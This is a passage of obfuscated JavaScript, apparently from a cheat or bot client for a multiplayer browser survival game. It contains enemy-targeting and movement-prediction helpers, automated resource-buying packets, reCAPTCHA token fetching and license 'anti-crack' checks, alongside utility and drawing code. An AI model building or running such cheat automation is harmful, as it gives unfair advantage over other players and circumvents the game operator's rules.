        d = (myPlayer.x - obj.x) ** 2 + (myPlayer.y - obj.y) ** 2;
        if (distSqrd === -1 || d < distSqrd) {
          distSqrd = d;
          nearest = obj;
        }
      }
    }
    return nearest;
  }
  function EnemyLowestHp(_param_546) {
    let _var_763 = null;
    let _var_764 = 201;
    for (let i = 0, len = _param_546.length; i < len; i++) {
      const player = _param_546[i];
      if (player.currentHp < _var_764) {
        _var_763 = player;
        _var_764 = player.currentHp;
      }
    }
    return _var_763;
  }
  function EnemyInRange(myPlayer, PlayerList, range) {
    let enemies = [];
    let counter = 0;
    for (let i = 0, len = PlayerList.length; i < len; i++) {
      const player = PlayerList[i];
      if (myPlayer.pid === player.pid) {
        continue;
      }
      if (!player.ally && myPlayer.fly === player.fly && !player.ghost) {
        if (Utils.dist(myPlayer, player) <= range) {
          enemies[counter] = player;
          counter++;
        }
      }
    }
    return enemies;
  }
  function getHigestScorePlayer(_param_547) {
    let _var_765 = null;
    let _var_b53 = 0;
    for (let i = 0, len = _param_547.length; i < len; i++) {
      const player = _param_547[i];
      const score = Object.values(player)[13];
      if (score > _var_b53) {
        _var_765 = player;
        _var_b53 = score;
      }
    }
    return _var_765;
  }
  function ObjNearestInGround(myPlayer, ObjList) {
    if (myPlayer.fly === 1) {
      return null;
    }
    let nearest = null;
    let distSqrd = -1;
    for (let i = 0, len = ObjList.length, obj = null, d = null; i < len; ++i) {
      obj = ObjList[i];
      let d = (myPlayer.x - obj.x) ** 2 + (myPlayer.y - obj.y) ** 2;
      if (distSqrd === -1 || d < distSqrd) {
        distSqrd = d;
        nearest = obj;
      }
    }
    return nearest;
  }
  function Pathfinder(currentPos, targetPos) {
    if (!currentPos || !targetPos) {
      return 0;
    }
    const {
      x: currX,
      y: currY
    } = currentPos;
    const {
      x: tgtX,
      y: tgtY
    } = targetPos;
    let direction = 0;
    if (currY + 25 < tgtY) {
      direction += 4;
    }
    if (tgtY + 25 < currY) {
      direction += 8;
    }
    if (currX + 25 < tgtX) {
      direction += 2;
    }
    if (tgtX + 25 < currX) {
      direction += 1;
    }
    return direction;
  }
  function calculateDirection(from, to, step, extraMode = true) {
    let dir = 0;
    if (from.y + step < to.y) {
      dir |= 4;
    }
    if (from.y > to.y + step) {
      dir |= 8;
    }
    if (from.x + step < to.x) {
      dir |= 2;
    }
    if (from.x > to.x + step) {
      dir |= 1;
    }
    if (dir === 0 && extraMode) {
      if (from.y < to.y) {
        dir |= 4;
      }
      if (from.y > to.y) {
        dir |= 8;
      }
      if (from.x < to.x) {
        dir |= 2;
      }
      if (from.x > to.x) {
        dir |= 1;
      }
    }
    return dir;
  }
  function PathFinder1(current, target) {
    if (!current || !target) {
      return 0;
    }
    const step = PingCounter / 1000 * current.speed;
    const currPos = PredictPosNow(current, PingCounter);
    let tgtPos = PredictPosNow(target, PingCounter);
    return calculateDirection(currPos, tgtPos, step);
  }
  function PathFinder2(_param_548, _param_549) {
    if (!_param_548 || !_param_549) {
      return 0;
    }
    const step = PingCounter / 1000 * _param_548.speed;
    const currPos = PredictPosNow(_param_548, PingCounter);
    let _var_767 = PredictPosNow(_param_549, PingCounter);
    return calculateDirection(currPos, _var_767, step, false);
  }
  function PathFinder3(current, target) {
    if (!current || !target) {
      return 0;
    }
    const step = PingCounter / 1000 * current.speed;
    const currPos = PredictPosNow(current, PingCounter);
    return calculateDirection(currPos, target, step, false);
  }
  function PredictPos(unit, scale = 1) {
    let __p_rHaZ_moveDir_x = unit.r.x - unit.r.oldX;
    let __p_rHaZ_moveDir_y = unit.r.y - unit.r.oldY;
    let magnitude = Math.sqrt(__p_rHaZ_moveDir_x ** 2 + __p_rHaZ_moveDir_y ** 2);
    if (magnitude !== 0) {
      __p_rHaZ_moveDir_x /= magnitude;
      __p_rHaZ_moveDir_y /= magnitude;
    } else {
      __p_rHaZ_moveDir_x = 0;
      __p_rHaZ_moveDir_y = 0;
    }
    let predictPos = {
      x: unit.r.x + __p_rHaZ_moveDir_x * unit.speed * (PingCounter / 1000) * scale,
      y: unit.r.y + __p_rHaZ_moveDir_y * unit.speed * (PingCounter / 1000) * scale
    };
    return predictPos;
  }
  function GetMoveDir(unit) {
    let dir = {
      x: unit.r.x - unit.x,
      y: unit.r.y - unit.y
    };
    let magnitude = Math.sqrt(dir.x ** 2 + dir.y ** 2);
    if (magnitude !== 0) {
      dir.x /= magnitude;
      dir.y /= magnitude;
    }
    return dir;
  }
  function PredictPosNow(_param_550, _param_551) {
    let _var_768 = GetMoveDir(_param_550);
    let _var_769 = _var_768.x * _param_550.speed * (_param_551 / 1000);
    let _var_c46 = _var_768.y * _param_550.speed * (_param_551 / 1000);
    let _var_d48 = Math.sqrt(_var_769 ** 2 + _var_c46 ** 2);
    let _var_770 = Math.sqrt((_param_550.r.x - _param_550.x) ** 2 + (_param_550.r.y - _param_550.y) ** 2);
    if (_var_d48 < _var_770) {
      return {
        x: _param_550.x + _var_769,
        y: _param_550.y + _var_c46
      };
    } else {
      return {
        x: _param_550.r.x,
        y: _param_550.r.y
      };
    }
  }
  function calcAngle(p1, p2, type) {
    if (p1 && p2) {
      if (type) {
        return Math.atan2(p2.r.y - p1.r.y, p2.r.x - p1.r.x);
      }
      return Math.atan2(p2.y - p1.y, p2.x - p1.x);
    }
    return null;
  }
  function toRadian(_param_552) {
    return _param_552 * (Math.PI / 180);
  }
  const pi2 = Math.PI * 2;
  function radianTo255Angle(radian) {
    return Math.floor((radian % pi2 + pi2) % pi2 * 255 / pi2);
  }
  function CheckAlly(e) {
    for (let i = 0; i < user.team.length; i++) {
      if (user.team[i] == e) {
        return true;
      }
    }
    return 0;
  }
  function updateAllys() {
    const updateCallBack = _param_553 => {
      _param_553.ally = user.id === _param_553.pid || CheckAlly(_param_553.pid);
    };
    world.units[ITEMS.PLAYERS].forEach(updateCallBack);
    world.units[ITEMS.SPIKE].forEach(updateCallBack);
    world.units[ITEMS.STONE_SPIKE].forEach(updateCallBack);
    world.units[ITEMS.GOLD_SPIKE].forEach(updateCallBack);
    world.units[ITEMS.DIAMOND_SPIKE].forEach(updateCallBack);
    world.units[ITEMS.AMETHYST_SPIKE].forEach(updateCallBack);
    world.units[ITEMS.REIDITE_SPIKE].forEach(updateCallBack);
    world.units[ITEMS.WOOD_DOOR].forEach(updateCallBack);
    world.units[ITEMS.WOOD_DOOR_SPIKE].forEach(updateCallBack);
    world.units[ITEMS.STONE_DOOR].forEach(updateCallBack);
    world.units[ITEMS.STONE_DOOR_SPIKE].forEach(updateCallBack);
    world.units[ITEMS.GOLD_DOOR].forEach(updateCallBack);
    world.units[ITEMS.GOLD_DOOR_SPIKE].forEach(updateCallBack);
    world.units[ITEMS.DIAMOND_DOOR].forEach(updateCallBack);
    world.units[ITEMS.DIAMOND_DOOR_SPIKE].forEach(updateCallBack);
    world.units[ITEMS.AMETHYST_DOOR].forEach(updateCallBack);
    world.units[ITEMS.AMETHYST_DOOR_SPIKE].forEach(updateCallBack);
    world.units[ITEMS.REIDITE_DOOR].forEach(updateCallBack);
    world.units[ITEMS.REIDITE_DOOR_SPIKE].forEach(updateCallBack);
    world.units[ITEMS.CHEST].forEach(updateCallBack);
  }
  function buyResource(_param_555, _param_554) {
    if (_param_554 <= 0 || !RESOURCE_MARKET[_param_555]) {
      return;
    }
    const {
      rate: rate,
      packetSize: packetSize,
      packetId: packetId
    } = RESOURCE_MARKET[_param_555];
    const requiredAmount = Math.round(_param_554 * rate);
    const fullPackets = Math.floor(requiredAmount / packetSize);
    const leftover = requiredAmount % packetSize;
    for (let i = 0; i < fullPackets; i++) {
      client.socket.send(JSON.stringify([__p_TBlw_PACKET_buy_resource, packetSize, packetId]));
    }
    if (leftover > 0) {
      client.socket.send(JSON.stringify([__p_TBlw_PACKET_buy_resource, leftover, packetId]));
    }
  }
  function buyResourceByCurrency(_param_557, _param_556) {
    if (_param_556 <= 0 || !RESOURCE_MARKET[_param_557]) {
      return;
    }
    const {
      packetSize: packetSize,
      packetId: packetId
    } = RESOURCE_MARKET[_param_557];
    const fullPackets = Math.floor(_param_556 / packetSize);
    const leftover = _param_556 % packetSize;
    for (let i = 0; i < fullPackets; i++) {
      client.socket.send(JSON.stringify([__p_TBlw_PACKET_buy_resource, packetSize, packetId]));
    }
    if (leftover > 0) {
      client.socket.send(JSON.stringify([__p_TBlw_PACKET_buy_resource, leftover, packetId]));
    }
  }
  function buyResourceByBerry(berryAvailable, maxAmount = Infinity) {
    const config = RESOURCE_MARKET.Wood;
    if (!config || berryAvailable <= 0) {
      return;
    }
    const {
      rate: rate
    } = config;
    const maxBuyable = Math.floor(berryAvailable * (1 / rate));
    const amountToBuy = Math.min(maxBuyable, maxAmount);
    if (amountToBuy > 0) {
      buyResource("Wood", amountToBuy);
    }
  }
  function getNearestIndex(pos, locations) {
    return locations.reduce((_param_560, _param_558, _param_561, _param_559) => {
      const dx = _param_558.x - pos.x;
      const dy = _param_558.y - pos.y;
      const dist = dx * dx + dy * dy;
      const minDist = _param_559[_param_560].x - pos.x;
      const minDy = _param_559[_param_560].y - pos.y;
      const minDistSq = minDy * minDy + minDist * minDist;
      if (dist < minDistSq) {
        return _param_561;
      } else {
        return _param_560;
      }
    }, 0);
  }
  function updateForestCastMarket() {
    Settings.Market.forestCast.wood = user.inv.n[INV.BERRY] * 3;
    Settings.Market.forestCast.stone = user.inv.n[INV.PUMPKIN] * 4;
    Settings.Market.forestCast.gold = user.inv.n[INV.BREAD] * 6;
    Settings.Market.forestCast.diamond = Math.floor(user.inv.n[INV.CARROT] / 4);
    Settings.Market.forestCast.amethyst = Math.floor(user.inv.n[INV.TOMATO] / 8);
    Settings.Market.forestCast.reidite = Math.floor(user.inv.n[INV.THORNBUSH] / 16);
  }
  const get_recaptcha_tokens = () => {
    return new Promise((_param_562, _param_563) => {
      grecaptcha.ready(function () {
        grecaptcha.execute("6LdvBaEjAAAAAIKTgdecsZBehRxhVZOIDzG9MvXg", {
          action: "validate_recaptcha"
        }).then(function (_param_564) {
          _param_562(_param_564);
        }).catch(e => {
          console.log(e);
          _param_563(e);
        });
      });
    });
  };
  let Utils = {
    get_recaptcha_token: get_recaptcha_tokens,
    open_in_new_tab: function (e) {
      window.open(e, "_blank").focus();
    },
    open_in_new_box: function (_param_565) {
      window.open(_param_565, "_blank", "location=yes,height=570,width=520,scrollbars=yes,status=yes");
    },
    compare_object: function (_param_566, _param_567) {
      for (_param_a2 in _param_566) {
        if (_param_566[_param_a2] != _param_567[_param_a2]) {
          return false;
        }
      }
      return true;
    },
    compare_array: function (e, t) {
      var i = 0;
      if (e.length != t.length) {
        return false;
      }
      for (; i < e.length; i++) {
        if (typeof e == "object") {
          if (!this.compare_object(e[i], t[i])) {
            return false;
          }
        } else if (e[i] != t[i]) {
          return false;
        }
      }
      return true;
    },
    copy_vector: function (_param_569, _param_568) {
      _param_568.x = _param_569.x;
      _param_568.y = _param_569.y;
    },
    get_vector: function (_param_570, _param_571) {
      return {
        x: _param_570.x - _param_571.x,
        y: _param_570.y - _param_571.y
      };
    },
    mul_vector: function (_param_572, _param_573) {
      _param_572.x *= _param_573;
      _param_572.y *= _param_573;
    },
    scalar_product: function (e, t) {
      return e.x * t.x + e.y * t.y;
    },
    norm: function (_param_574) {
      return Math.sqrt(_param_574.x * _param_574.x + _param_574.y * _param_574.y);
    },
    sign: function (_param_575) {
      if (_param_575 < 0) {
        return -1;
      } else {
        return 1;
      }
    },
    cross_product: function (_param_576, _param_577) {
      return _param_576.x * _param_577.y - _param_576.y * _param_577.x;
    },
    get_angle_2: function (_param_581, _param_579, _param_580, _param_578) {
      return Math.atan2(_param_578 - _param_579, _param_580 - _param_581);
    },
    get_angle: function (e, t) {
      return Math.acos(this.scalar_product(e, t) / (this.norm(e) * this.norm(t))) * this.sign(this.cross_product(e, t));
    },
    getURLData: function (_param_582) {
      _url = location.href;
      _param_582 = _param_582.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
      _param_582 = new RegExp("[\\?&]" + _param_582 + "=([^&#]*)").exec(_url);
      if (_param_582 === null) {
        return null;
      } else {
        return _param_582[1];
      }
    },
    reduceAngle: function (e, t) {
      var i = Math.PI * 2;
      t = (t % i + i) % i;
      if (Math.abs(e - t) > Math.PI) {
        if (e > t) {
          return t + i;
        } else {
          return t - i;
        }
      }
      return t;
    },
    get_std_angle: function (e, t) {
      return this.get_angle({
        x: 0,
        y: 1
      }, this.get_vector(e, t));
    },
    dist: function (_param_584, _param_583) {
      return Math.sqrt((_param_583.x - _param_584.x) * (_param_583.x - _param_584.x) + (_param_583.y - _param_584.y) * (_param_583.y - _param_584.y));
    },
    build_vector: function (e, t) {
      return {
        x: Math.cos(t) * e,
        y: Math.sin(t) * e
      };
    },
    add_vector: function (_param_585, _param_586) {
      _param_585.x += _param_586.x;
      _param_585.y += _param_586.y;
    },
    sub_vector: function (_param_587, _param_588) {
      _param_587.x -= _param_588.x;
      _param_587.y -= _param_588.y;
    },
    translate_vector: function (e, t, i) {
      e.x += t;
      e.y += i;
    },
    translate_new_vector: function (e, t, i) {
      return {
        x: e.x + t,
        y: e.y + i
      };
    },
    move: function (e, t, i) {
      e.x += Math.cos(i) * t;
      e.y += Math.sin(i) * t;
    },
    middle: function (_param_589, _param_590) {
      return Math.floor((_param_589 - _param_590) / 2);
    },
    middle_point: function (e, t) {
      return {
        x: (e.x + t.x) / 2,
        y: (e.y + t.y) / 2
      };
    },
    rand_sign: function () {
      if (Math.random() > 0.5) {
        return 1;
      } else {
        return -1;
      }
    },
    get_rand_pos_in_circle: function (e, t, i) {
      var _0x2893cc = this.rand_sign();
      var _0x148a2f;
      var _0x1cc90a;
      _0x148a2f = this.rand_sign();
      _0x1cc90a = Math.random() * Math.PI / 2;
      return {
        x: Math.floor(e + Math.cos(_0x1cc90a) * _0x2893cc * i),
        y: Math.floor(t + Math.sin(_0x1cc90a) * _0x148a2f * i)
      };
    },
    Box: function (e, t, i, r) {
      this.x = e;
      this.y = t;
      this.w = i;
      this.h = r;
    },
    randomize_list: function (e) {
      var _0x13c4ea = [];
      a = [];
      a.push.apply(a, e);
      while (a.length > 0) {
        var _0x23a9a7 = Math.floor(Math.random() * a.length);
        _0x13c4ea.push(a[_0x23a9a7]);
        a.splice(_0x23a9a7, 1);
      }
      return _0x13c4ea;
    },
    restore_number: function (_param_591) {
      if (_param_591 >= 20000) {
        _param_591 = (_param_591 - 20000) * 1000;
      } else if (_param_591 >= 10000) {
        _param_591 = (_param_591 - 10000) * 100;
      }
      return _param_591;
    },
    simplify_number: function (e) {
      if (typeof e !== "number") {
        return "0";
      } else if (e >= 10000) {
        var _0x496e58 = Math.floor(Math.log10(e)) - 2;
        var _0x1cce92;
        var _0x3ab572;
        _0x1cce92 = Math.max(0, 3 - _0x496e58);
        _0x3ab572 = Math.floor(e / 1000).toString();
        if (_0x1cce92) {
          _0x3ab572 += "." + (e % 1000 / 1000).toString().substring(2).substring(0, _0x1cce92);
          for (var _0x447b3d = _0x3ab572.length - 1, _0x3a8904 = 0; _0x447b3d > 0; _0x447b3d--) {
            if (_0x3ab572[_0x447b3d] != "0") {
              break;
            } else {
              _0x3a8904++;
            }
          }
          _0x3ab572 = _0x3ab572.substring(0, _0x3ab572.length - _0x3a8904);
          if (_0x3ab572[_0x3ab572.length - 1] == ".") {
            _0x3ab572 = _0x3ab572.substring(0, _0x3ab572.length - 1);
          }
        }
        _0x3ab572 += "k";
        return _0x3ab572;
      } else {
        return e.toString();
      }
    },
    ease_out_quad: function (e) {
      return e * (2 - e);
    },
    ease_out_cubic: function (e) {
      return --e * e * e + 1;
    },
    ease_in_out_quad: function (_param_592) {
      if (_param_592 < 0.5) {
        return _param_592 * 2 * _param_592;
      } else {
        return -1 + (4 - _param_592 * 2) * _param_592;
      }
    },
    ease_in_out_cubic: function (e) {
      if (e < 0.5) {
        return e * 4 * e * e;
      } else {
        return (e - 1) * (e * 2 - 2) * (e * 2 - 2) + 1;
      }
    },
    ease_in_out_quart: function (_param_593) {
      if (_param_593 < 0.5) {
        return _param_593 * 8 * _param_593 * _param_593 * _param_593;
      } else {
        return 1 - --_param_593 * 8 * _param_593 * _param_593 * _param_593;
      }
    },
    ease_out_quart: function (_param_594) {
      return 1 - --_param_594 * _param_594 * _param_594 * _param_594;
    },
    ease_out_quint: function (_param_595) {
      return 1 + --_param_595 * _param_595 * _param_595 * _param_595 * _param_595;
    },
    LinearAnimation: function (o, v, max, min, max_speed, min_speed) {
      this.o = o;
      this.v = v;
      this.max = max;
      this.min = min;
      this.max_speed = max_speed;
      this.min_speed = min_speed;
      this.last = 0;
      this.update = function () {
        if (this.o) {
          var newV = this.v + delta * this.max_speed;
          if (newV > this.max) {
            this.v = this.max;
            this.o = false;
            return true;
          } else {
            this.v = newV;
          }
        } else {
          var newV = this.v - delta * this.min_speed;
          if (newV < this.min) {
            this.v = this.min;
            this.o = true;
          } else {
            this.v = newV;
          }
        }
      };
      return false;
    },
    Ease: function (e, t, i, r, a, o) {
      this.fun = e;
      this.ed = t;
      this.em = i;
      this.sx = r;
      this.x = a;
      this.ex = o;
      this.restart = function () {
        this.x = this.sex;
        this.ed = 0;
      };
      this.ease = function (e) {
        if (e !== this.ex) {
          this.ex = e;
          this.sx = this.x;
          this.ed = 0;
        }
        if (this.ex !== this.x) {
          this.ed += delta;
          if (this.ed > this.em) {
            this.x = this.ex;
          } else {
            var e = this.fun(this.ed / this.em);
            this.x = this.sx + (this.ex - this.sx) * e;
          }
        }
      };
    },
    Ease2d: function (e, t, i, r, a, o, n, s, _) {
      this.fun = e;
      this.ed = t;
      this.em = i;
      this.sx = r;
      this.sy = a;
      this.x = o;
      this.y = n;
      this.ex = s;
      this.ey = _;
      this.ease = function (_0x4dceaf) {
        if (_0x4dceaf.x != this.ex || _0x4dceaf.y != this.ey) {
          this.ex = _0x4dceaf.x;
          this.ey = _0x4dceaf.y;
          this.sx = this.x;
          this.sy = this.y;
          this.ed = 0;
        }
        if (this.ex != this.x || this.ey != this.y) {
          this.ed += delta;
          if (this.ed > this.em) {
            this.x = this.ex;
            this.y = this.ey;
          } else {
            var _0x1ebc43 = this.fun(this.ed / this.em);
            this.x = this.sx + (this.ex - this.sx) * _0x1ebc43;
            this.y = this.sy + (this.ey - this.sy) * _0x1ebc43;
          }
        }
      };
    },
    generate_token: function (_param_596) {
      let _var_771 = "";
      for (let _var_772 = 0; _var_772 < _param_596; _var_772++) {
        _var_771 += String.fromCharCode(48 + Math.floor(Math.random() * 74));
      }
      return _var_771;
    },
    gup: function (e, t) {
      var _0x2fa8d4;
      var _0x292148;
      var _0x3105f0;
      if (!t) {
        t = location.href;
      }
      e = e.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
      _0x2fa8d4 = "[\\?&]" + e + "=([^&#]*)";
      _0x292148 = new RegExp(_0x2fa8d4);
      _0x3105f0 = _0x292148.exec(t);
      if (_0x3105f0 == null) {
        return null;
      } else {
        return _0x3105f0[1];
      }
    },
    inside_box: function (_param_597, _param_598) {
      if (_param_597.x >= _param_598.x && _param_597.x <= _param_598.x + _param_598.w && _param_597.y >= _param_598.y && _param_597.y <= _param_598.y + _param_598.h) {
        return true;
      }
      return false;
    },
    intersect_aabb: function (_0x51caf2, _0x39b93d, _0x2315f4, _0x3b7202, _0x3fde8e, _0x3ec63e, _0x47b495, _0x50d940) {
      if (Math.max(_0x51caf2, _0x3fde8e) < Math.min(_0x39b93d, _0x3ec63e) && Math.max(_0x2315f4, _0x47b495) < Math.min(_0x3b7202, _0x50d940)) {
        return 1;
      }
      return 0;
    },
    lerp: function (_param_600, _param_601, _param_599) {
      return (1 - _param_599) * _param_600 + _param_599 * _param_601;
    },
    escape_html: function (e) {
      return e.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
    }
  };
  let incrementAntiCrackCount = 0;
  let detectionCounter = 0;
  let isDebuggerDetected = 0;
  function performAntiCrack() {
    incrementAntiCrackCount++;
    if (incrementAntiCrackCount > 1000) {
      incrementAntiCrackCount = 0;
      if (localStorage.getItem("lmb_key") === null) {
        isDebuggerDetected = 1;
      }
    }
    if (isDebuggerDetected === 1) {
      detectionCounter++;
      if (detectionCounter > 10000) {
        eval("window.settings = {};");
      }
    }
  }
  function performAntiCrack2() {
    const key = localStorage.getItem("lmb_key");
    if (key === null || key.length !== 64) {
      const guiContainer = document.createElement("div");
      guiContainer.id = "gui-container";
      document.body.appendChild(guiContainer);
    }
  }
  function extractBaseUrl(url) {
    let baseUrl = url.split("?")[0];
    let slashSplit = baseUrl.split("/");
    return slashSplit[slashSplit.length - 1];
  }
  function CTI(_param_602) {
    let _var_773 = new Image();
    _var_773.src = _param_602.toDataURL("image/png");
    _var_773.width = _param_602.width;
    _var_773.height = _param_602.height;
    _var_773.isLoaded = 1;
    return _var_773;
  }
  function create_text(_param_605, _param_610, _param_606, _param_613, _param_611, _param_604, _param_608, _param_607, _param_609, _param_612, _param_603 = 0) {
    let _var_a55 = document.createElement("canvas");
    let _var_b54 = _var_a55.getContext("2d");
    _param_604 = !_param_604 ? 0 : _param_604 * _param_605;
    let _var_774 = Math.floor(_param_605 * _param_606);
    _var_b54.font = _var_774 + "px Baloo Paaji";
    _var_b54.lineJoin = "round";
    _param_607 = _param_607 * _param_605;
    let _var_d49 = _param_608 ? _param_607 * 2 : 0;
    if (_param_609) {
      let _var_775 = Math.min(_var_b54.measureText(_param_610).width + _param_605 * 2 + _var_d49, _param_609);
    } else {
      _var_775 = _var_b54.measureText(_param_610).width + _param_605 * 2 + _var_d49 + _param_603 * _param_605 * 2;
    }
    _var_774 = (_var_774 + _param_604 + _param_603) * _param_605 + _var_d49;
    _var_a55.width = _var_775;
    _var_a55.height = _var_774;
    if (_param_608) {
      _var_b54.fillStyle = _param_608;
      round_rect(_var_b54, 0, 0, _var_775, _var_774, _param_607 * 2);
      _var_b54.fill();
      _var_b54.translate(_param_607, _param_607);
    }
    _var_b54.textBaseline = "middle";
    _var_b54.font = _param_606 + "px Baloo Paaji";
    _var_b54.lineJoin = "round";
    if (_param_611) {
      _var_b54.beginPath();
      _var_b54.fillStyle = _param_611;
      _var_b54.fillText(_param_610, 0, _var_774 / 2 + _param_604 - _var_d49 / 2, _var_775);
    }
    _var_b54.beginPath();
    if (_param_612) {
      _var_b54.strokeStyle = _param_612;
      _var_b54.lineWidth = _param_603;
      _var_b54.strokeText(_param_610, _param_603, (_var_774 - _var_d49) / 2, _var_775);
    }
    _var_b54.fillStyle = _param_613;
    _var_b54.fillText(_param_610, _param_603, (_var_774 - _var_d49) / 2, _var_775);
    return _var_a55;
  }
  function ctxDrawImage(ctx, image, sx, sy, sw, sh, dx, dy, dw, dh) {
    if (image.tryLoad === undefined || image.tryLoad() === 1) {
      if (!image.src && image._src) {
        image.src = image._src;
      }
      if (dh !== undefined) {
        ctx.drawImage(image, sx, sy, Math.max(1, sw), Math.max(1, sh), dx, dy, dw, dh);
      } else if (sh !== undefined) {
        ctx.drawImage(image, sx, sy, sw, sh);
      } else {
        ctx.drawImage(image, sx, sy);
      }
    }
  }
  function fill_path(e, t, i, r) {
    if (t) {
      e.fillStyle = t;
      e.fill();
    }
    if (i) {
      e.lineWidth = r;
      e.strokeStyle = i;
      e.stroke();
    }
  }
  function round_rect(ctx, x, y, width, heigth, radius) {
    if (width < radius * 2) {
      radius = width / 2;
    }
    if (heigth < radius * 2) {
      radius = heigth / 2;
    }
    if (radius < 0) {
      radius = 0;
    }
    ctx.beginPath();
    ctx.moveTo(x + radius, y);
    ctx.arcTo(x + width, y, x + width, y + heigth, radius);
    ctx.arcTo(x + width, y + heigth, x, y + heigth, radius);
    ctx.arcTo(x, y + heigth, x, y, radius);
    ctx.arcTo(x, y, x + width, y, radius);
    ctx.closePath();
  }
  function circle(_param_614, _param_615, _param_616, _param_617) {
    _param_614.beginPath();
    _param_614.arc(_param_615, _param_616, _param_617, 0, Math.PI * 2);
  }
  function create_symbol_hud(_param_618, _param_619, _param_620) {
    let _var_776 = document.createElement("canvas");
    let _var_777 = _var_776.getContext("2d");
    let _var_778 = _param_618 * 109;
    let _var_d50 = _param_618 * 110;
    _var_776.width = _var_778;
    _var_776.height = _var_d50;
    let _var_e30 = _param_618 * 54.5;
    let _var_779 = _param_618 * 55;
    let _var_780 = _param_618 * 48.038209575038294;
    circle(_var_777, _var_e30, _var_779, _var_780);
    let _var_781 = _param_619[0];
    let _var_i40 = _param_619[1];
    let _var_782 = _param_618 * 8;
    fill_path(_var_777, _var_781, _var_i40, _var_782);
    if (_param_620 === 0) {
      _var_777.beginPath();
      _var_777.lineCap = "round";
      _var_777.lineJoin = "round";
      _var_777.moveTo(_param_618 * 54.928558349609375, _param_618 * 43.72320556640625);
      _var_777.bezierCurveTo(_param_618 * 66.92855834960938, _param_618 * 31.72320556640625, _param_618 * 69.92855834960938, _param_618 * 29.72320556640625, _param_618 * 74.92855834960938, _param_618 * 29.72320556640625);
      _var_777.bezierCurveTo(_param_618 * 86.92855834960938, _param_618 * 28.72320556640625, _param_618 * 91.92855834960938, _param_618 * 42.72320556640625, _param_618 * 89.92855834960938, _param_618 * 52.72320556640625);
      _var_777.bezierCurveTo(_param_618 * 88.92855834960938, _param_618 * 63.72320556640625, _param_618 * 73.92855834960938, _param_618 * 75.72320556640625, _param_618 * 55.928558349609375, _param_618 * 87.72320556640625);
      _var_777.bezierCurveTo(_param_618 * 37.928558349609375, _param_618 * 78.72320556640625, _param_618 * 26.928558349609375, _param_618 * 65.72320556640625, _param_618 * 19.928558349609375, _param_618 * 54.72320556640625);
      _var_777.bezierCurveTo(_param_618 * 13.928558349609375, _param_618 * 42.72320556640625, _param_618 * 21.928558349609375, _param_618 * 28.72320556640625, _param_618 * 35.928558349609375, _param_618 * 29.72320556640625);
      _var_777.bezierCurveTo(_param_618 * 45.928558349609375, _param_618 * 31.72320556640625, _param_618 * 51.928558349609375, _param_618 * 40.72320556640625, _param_618 * 53.928558349609375, _param_618 * 44.72320556640625);
      _var_777.closePath();
      fill_path(_var_777, _param_619[2]);
    } else if (_param_620 === 1) {
      _var_777.save();
      _var_777.translate(_param_618 * 55, _param_618 * 39.48748779296875);
      round_rect(_var_777, _param_618 * -11.5, _param_618 * -36, _param_618 * 23, _param_618 * 72, _param_618 * 10);
      _var_777.restore();
      fill_path(_var_777, _param_619[2], _param_619[3], _param_618 * 4);
      circle(_var_777, _param_618 * 54.5, _param_618 * 78.48748779296875, _param_618 * 22.02271554554524);
      fill_path(_var_777, _param_619[4], _param_619[3], _param_618 * 4);
      _var_777.save();
      _var_777.translate(_param_618 * 55.5, _param_618 * 57.287506103515625);
      round_rect(_var_777, _param_618 * -9, _param_618 * -16, _param_618 * 18, _param_618 * 32, _param_618 * 10);
      _var_777.restore();
      fill_path(_var_777, _param_619[4]);
      _var_777.beginPath();
      _var_777.lineCap = "round";
      _var_777.lineJoin = "round";
      _var_777.moveTo(_param_618 * 66.5, _param_618 * 25.287506103515625);
      _var_777.bezierCurveTo(_param_618 * 60.5, _param_618 * 25.287506103515625, _param_618 * 63.5, _param_618 * 25.287506103515625, _param_618 * 54.5, _param_618 * 25.287506103515625);
      _var_777.closePath();
      fill_path(_var_777, undefined, _param_619[5], _param_618 * 4);
      _var_777.beginPath();
      _var_777.lineCap = "round";
      _var_777.lineJoin = "round";
      _var_777.moveTo(_param_618 * 66.5, _param_618 * 37.287506103515625);
      _var_777.bezierCurveTo(_param_618 * 60.5, _param_618 * 37.287506103515625, _param_618 * 60.5, _param_618 * 37.287506103515625, _param_618 * 54.5, _param_618 * 37.287506103515625);
      _var_777.closePath();
      fill_path(_var_777, undefined, _param_619[5], _param_618 * 4);
      _var_777.beginPath();
      _var_777.lineCap = "round";
      _var_777.lineJoin = "round";
      _var_777.moveTo(_param_618 * 66.5, _param_618 * 50.287506103515625);
      _var_777.bezierCurveTo(_param_618 * 61, _param_618 * 50.287506103515625, _param_618 * 61, _param_618 * 50.287506103515625, _param_618 * 55.5, _param_618 * 50.287506103515625);
      _var_777.closePath();
      fill_path(_var_777, undefined, _param_619[5], _param_618 * 4);
    } else if (_param_620 === 2) {
      _var_777.beginPath();
      _var_777.lineCap = "round";
      _var_777.lineJoin = "round";
      _var_777.moveTo(_param_618 * 45.928558349609375, _param_618 * 55.29463195800781);
      _var_777.bezierCurveTo(_param_618 * 38.928558349609375, _param_618 * 67.29463195800781, _param_618 * 38.928558349609375, _param_618 * 67.29463195800781, _param_618 * 31.928558349609375, _param_618 * 79.29463195800781);
      _var_777.bezierCurveTo(_param_618 * 15.928558349609375, _param_618 * 85.29463195800781, _param_618 * 17.928558349609375, _param_618 * 86.29463195800781, _param_618 * 17.928558349609375, _param_618 * 90.29463195800781);
      _var_777.bezierCurveTo(_param_618 * 19.928558349609375, _param_618 * 94.29463195800781, _param_618 * 21.928558349609375, _param_618 * 94.29463195800781, _param_618 * 27.928558349609375, _param_618 * 92.29463195800781);
      _var_777.bezierCurveTo(_param_618 * 29.928558349609375, _param_618 * 98.29463195800781, _param_618 * 30.928558349609375, _param_618 * 99.29463195800781, _param_618 * 33.928558349609375, _param_618 * 99.29463195800781);
      _var_777.bezierCurveTo(_param_618 * 38.928558349609375, _param_618 * 97.29463195800781, _param_618 * 38.928558349609375, _param_618 * 93.29463195800781, _param_618 * 37.928558349609375, _param_618 * 86.29463195800781);
      _var_777.bezierCurveTo(_param_618 * 45.428558349609375, _param_618 * 73.29463195800781, _param_618 * 51.928558349609375, _param_618 * 64.29463195800781, _param_618 * 52.928558349609375, _param_618 * 60.29463195800781);
      _var_777.closePath();
      fill_path(_var_777, _param_619[2]);
      _var_777.beginPath();
      _var_777.lineCap = "round";
      _var_777.lineJoin = "round";
